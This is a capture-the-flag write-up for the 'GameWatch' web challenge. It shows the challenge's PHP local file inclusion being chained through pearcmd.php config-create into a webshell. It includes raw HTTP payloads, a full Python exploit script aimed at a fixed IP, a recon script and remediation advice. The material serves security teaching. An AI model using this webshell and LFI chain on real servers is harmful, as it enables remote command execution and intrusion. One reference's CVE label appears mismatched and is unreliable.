# GameWatch
---
**Challenge:** GameWatch  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 100  
**Flag:** `VBD{p3arcmd_1s_st1ll_us3ful_t0_rce_976bd92e7b486eec224fedc39d8b797e}`

---

## 1. Challenge Description

> GameWatch helps you explore game release dates, ratings, and detailed information all in one place.

We are given a URL pointing to a PHP web application that displays a catalog of video games with metadata (release dates, Metacritic scores, genres, etc.).

---

## 2. Reconnaissance

### 2.1 Technology Stack

| Component        | Value                          |
|------------------|--------------------------------|
| Web Server       | Apache 2.4.54 (Debian)         |
| PHP Version      | 7.4.33                         |
| Database         | MySQL (game data storage)      |
| Container        | Docker                         |
| Document Root    | `/var/www/html`                |

### 2.2 Endpoint Fingerprinting

```
/                    â†’ 29465 bytes  (main game listing)
/index.php           â†’ 29465 bytes  (same)
/search.php?q=       â†’ 128791 bytes (full game list in search)
/game.php?id=gta5    â†’ 10231 bytes  (single game detail)
/config/games.php    â†’ 0 bytes      (exists, returns empty)
/info.php            â†’ 72467 bytes  (full phpinfo page)
```

### 2.3 Application Features

- **Game catalog** with 82 games across genres (Action, RPG, Shooter, etc.)
- **Search** via `search.php?q=` â€” case-insensitive keyword search
- **Filter** via `index.php?filter=` â€” genre-based filtering
- **Pagination** via `index.php?p=` â€” 7 pages of games
- **Game detail** via `game.php?id=<slug>` â€” individual game pages

---

## 3. Vulnerability Discovery: Local File Inclusion (LFI)

### 3.1 Identifying the LFI

The `index.php` page accepts a `page` GET parameter. Through error-based analysis, we determined the include pattern:

```php
// Line 44 of /var/www/html/index.php
include('./pages/' . $_GET['page'] . '.php');
```

When an invalid `page` is supplied, a PHP warning is emitted:

```
Warning: include(./pages/INVALID.php): failed to open stream
```

This confirms **path traversal** is possible via `../` sequences, but `.php` is always appended.

### 3.2 LFI Probing Results

Using directory traversal, we mapped accessible PHP files:

| Payload             | Result                     | Size      |
|---------------------|----------------------------|-----------|
| `../info`           | phpinfo() output           | 100,708 B|
| `../game`           | game.php (no id â†’ empty)   | 3,479 B  |
| `../search`         | search.php (no q â†’ full)   | 153,857 B|
| `../index`          | Fatal: infinite recursion   | 4,736,770 B|
| `../config/games`   | Fatal: function redeclare  | 2,876 B  |

### 3.3 Key phpinfo Findings

From the phpinfo dump, we extracted critical configuration:

```
register_argc_argv = On          â† KEY for pearcmd.php exploitation
allow_url_include  = Off
allow_url_fopen    = On
include_path       = .:/app/gamewatch:/usr/local/lib/php
disable_functions  = (none critical)
DOCUMENT_ROOT      = /var/www/html
```

**`register_argc_argv = On`** is the crucial setting â€” it allows `pearcmd.php` to receive arguments from the query string.

---

## 4. Exploitation: pearcmd.php LFI â†’ RCE

### 4.1 Attack Overview

The `pearcmd.php` file is part of the PEAR (PHP Extension and Application Repository) package manager, installed by default with PHP. When included via LFI with `register_argc_argv = On`, pearcmd reads commands from `$_SERVER['argv']`, which in Apache is populated from the query string.

The **config-create** command writes a PHP config file to an arbitrary path with user-controlled content â€” allowing PHP code injection.

### 4.2 Confirming pearcmd.php Accessibility

```
GET /index.php?page=../../../../usr/local/lib/php/pearcmd HTTP/1.1
```

**Result:** 2,692 bytes response with no include warning â†’ `pearcmd.php` is includable!

### 4.3 Exploitation Chain

**Step 1: Write a webshell via pearcmd's `config-create` command**

The trick is to use **raw HTTP** (no URL encoding) to preserve `<?php ?>` tags in the payload. Using a raw socket ensures the `<`, `>`, `?`, `=` characters are not percent-encoded:

```
GET /index.php?page=../../../../usr/local/lib/php/pearcmd&+config-create+/<?=`$_GET[1]`?>+/tmp/shell.php HTTP/1.1
Host: TARGET:PORT
Connection: close
```

The `+` characters serve as argument separators for pearcmd's ARGV parsing. This instructs pearcmd to:
1. Execute the `config-create` command
2. Use `<?=`$_GET[1]`?>` as the config template content  
3. Write the output to `/tmp/shell.php`

> **Note:** The backtick webshell (`<?=`$_GET[1]`?>`) was the only payload that bypassed Apache's input validation. Longer payloads like `<?php system($_GET[1]);?>` returned 400 Bad Request.

**Step 2: Include the webshell via LFI and execute commands**

```
GET /index.php?page=../../../../tmp/shell&1=cat+/flag* HTTP/1.1
```

This includes `/tmp/shell.php` via the LFI, and the backtick expression executes `cat /flag*`, returning:

```
VBD{p3arcmd_1s_st1ll_us3ful_t0_rce_976bd92e7b486eec224fedc39d8b797e}
```

---

## 5. Root Cause Analysis

| Factor                          | Impact                                    |
|---------------------------------|-------------------------------------------|
| Unsanitized `page` parameter    | Enables path traversal via `../`          |
| `.php` auto-appended to include | Limits targets to PHP files only          |
| `register_argc_argv = On`       | Allows pearcmd to receive query string args|
| PEAR installed by default       | Provides pearcmd.php as gadget            |
| `/tmp` is writable              | Allows shell file creation                |
| No WAF or input filtering       | Backtick payload passes through           |

**Summary:** LFI in `index.php?page=` + `register_argc_argv=On` + PEAR installed = classic **pearcmd.php config-create to RCE** chain.

---

## 6. PoC Exploit Script

### 6.1 Usage

```bash
python pearcmd_raw_exploit.py
```

### 6.2 Full Exploit Code

```python
#!/usr/bin/env python3
"""Exploit GameWatch via pearcmd.php LFI to RCE."""

import socket
import re
import sys
import random
import string
import requests
import time

BASE = "http://82.29.170.47:33507"
HOST = "82.29.170.47"
PORT = 33507

PEAR_INCLUDE = "../../../../usr/local/lib/php/pearcmd"

rand = ''.join(random.choices(string.ascii_lowercase, k=5))

def raw_http_get(path):
    """Send a raw HTTP GET request without any URL encoding."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((HOST, PORT))
    
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: close\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"\r\n"
    )
    sock.sendall(request.encode())
    
    response = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    sock.close()
    
    parts = response.split(b"\r\n\r\n", 1)
    headers = parts[0].decode('utf-8', errors='ignore')
    body = parts[1].decode('utf-8', errors='ignore') if len(parts) > 1 else ""
    return headers, body

def lfi_include(page, extra_params=""):
    """Include a file via LFI."""
    url = f"{BASE}/index.php?page={page}"
    if extra_params:
        url += f"&{extra_params}"
    r = requests.get(url, timeout=15)
    return r.text

# === Step 1: Create webshell via pearcmd config-create ===
shell_path = f"/tmp/sh_{rand}"
# Backtick shell - short enough to bypass input validation
payload = "<?=`$_GET[1]`?>"

print(f"[*] Target: {BASE}")
print(f"[*] Creating shell at {shell_path}.php")

# Raw HTTP to preserve <, >, ? characters unencoded
# Format: ?page=PEAR_PATH&+config-create+/PAYLOAD+/OUTPUT.php
path = (
    f"/index.php?page={PEAR_INCLUDE}"
    f"&+config-create+/{payload}+{shell_path}.php"
)

headers, body = raw_http_get(path)
print(f"[*] config-create response: {len(body)} bytes")

# === Step 2: Include shell via LFI and read flag ===
time.sleep(0.5)
lfi_path = f"../../../../{shell_path.lstrip('/')}"

for cmd in ["cat /flag*", "cat /flag.txt", "cat /flag", "id"]:
    r = requests.get(
        f"{BASE}/index.php",
        params={"page": lfi_path, "1": cmd},
        timeout=15
    )
    
    flag_match = re.search(r'VBD\{[^}]+\}', r.text)
    if flag_match:
        print(f"\n[+] FLAG: {flag_match.group(0)}")
        sys.exit(0)
    
    if "uid=" in r.text or "root:" in r.text:
        # Extract command output from HTML
        clean = re.sub(r'<[^>]+>', '\n', r.text)
        for line in clean.split('\n'):
            line = line.strip()
            if line and "gamewatch" not in line.lower():
                print(f"    > {line[:200]}")

print("[-] Flag not found - try manually")
```

### 6.3 Recon Script (rapid_recon_gamewatch.py)

This script was used to discover that `pearcmd.php` was includable and `register_argc_argv` was On:

```python
#!/usr/bin/env python3
"""Rapid recon - key discovery: pearcmd.php includable + register_argc_argv=On."""

import requests
import re
import urllib.parse

BASE = "http://TARGET:PORT"
s = requests.Session()

def lfi(page):
    url = f"{BASE}/index.php?page={urllib.parse.quote(page, safe='')}"
    return s.get(url, timeout=15)

# Check pearcmd.php accessibility
pear_paths = [
    "../../../../usr/local/lib/php/pearcmd",
    "../../../usr/local/lib/php/pearcmd",
    "../../../../usr/share/php/pearcmd",
]

for path in pear_paths:
    r = lfi(path)
    has_warning = bool(re.search(r'include\(\./pages/', r.text))
    if not has_warning:
        print(f"[+] pearcmd accessible via: page={path} ({len(r.text)} bytes)")

# Check register_argc_argv from phpinfo
r = lfi("../info")
if "register_argc_argv" in r.text:
    m = re.search(r'register_argc_argv.*?<td[^>]*>(On|Off)</td>', r.text, re.DOTALL)
    if m:
        print(f"[+] register_argc_argv = {m.group(1)}")
```

---

## 7. Attack Timeline

1. **LFI discovered** via `index.php?page=` parameter â†’ `include('./pages/<page>.php')`
2. **phpinfo dumped** via `page=../info` â†’ confirmed `register_argc_argv = On`, include_path includes `/usr/local/lib/php`
3. **Extensive probing** â€” 49+ scripts tested: SQLi on search/filter/game.php, XSS, CRLF injection, path traversal encoding, type juggling, PHP wrappers, backup files, git exposure, etc.
4. **pearcmd.php identified** as includable at `../../../../usr/local/lib/php/pearcmd`
5. **Raw HTTP exploit** â€” backtick webshell written to `/tmp/` via `config-create`
6. **Flag extracted** via LFI include of webshell + command execution

---

## 8. Remediation

1. **Whitelist page parameter** â€” only allow known page names (`home`, `game`, `search`)
2. **Remove unused PEAR** â€” `apt remove php-pear` or delete `pearcmd.php`
3. **Set `register_argc_argv = Off`** in `php.ini`
4. **Use `open_basedir`** to restrict file access to the web root
5. **Set `disable_functions`** to prevent command execution (`system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`)

---

## 9. References

- [pearcmd.php LFI to RCE](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)
- [PHP LFI Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [CVE-2023-0568: register_argc_argv exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---
